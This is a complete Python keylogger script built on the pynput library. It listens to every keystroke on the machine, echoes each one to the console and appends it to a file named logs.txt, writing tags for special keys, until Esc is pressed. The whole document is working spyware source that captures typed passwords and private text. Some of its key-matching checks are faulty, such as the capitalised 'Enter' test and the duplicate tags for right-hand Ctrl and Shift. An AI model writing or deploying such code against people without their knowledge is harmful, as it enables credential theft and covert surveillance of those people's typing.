from pynput.keyboard import Key, Listener


# on_press(key)
# @parameters: key
# @return: void
# Gets called whenever a key pressed


def on_press(key):
    print(f'{key}')
    write_file(key)


# write_file(key
# @parameters: key
# @return: void
# Writes the key pressed onto a file


def write_file(key):
    with open("logs.txt", "a") as f:
        ke = str(key).replace("'", "")
        if ke.find("space") > 0:
            f.write('\n')
        if ke.find("tab") > 0:
            f.write("<tab>")
        if ke.find("ctrl") > 0:
            f.write("<ctrl>")
        if ke.find("caps_lock") > 0:
            f.write("<Caps_Lock>")
        if ke.find("shift") > 0:
            f.write("<Shift>")
        if ke.find("cmd") > 0:
            f.write("<Command>")
        if ke.find("alt") > 0:
            f.write("<Alt>")
        if ke.find("ctrl_r") > 0:
            f.write("<Ctrl_r>")
        if ke.find("shift_r") > 0:
            f.write("<Shift_r>")
        if ke.find("up") > 0:
            f.write("<Up>")
        if ke.find("down") > 0:
            f.write("<Down>")
        if ke.find("left") > 0:
            f.write("<Left>")
        if ke.find("right") > 0:
            f.write("<Right>")
        if ke.find("Enter") > 0:
            f.write("<Enter>")
        if ke.find("backspace") > 0:
            f.write("<Backspace>")
        if ke.find("delete") > 0:
            f.write("<Delete>")
        if ke.find("Key") == -1:
            f.write(ke)


# on_release(key)
# @parameters: key
# @return: void
# Checks if the released button is esc and closes the program


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listner:
    listner.join()
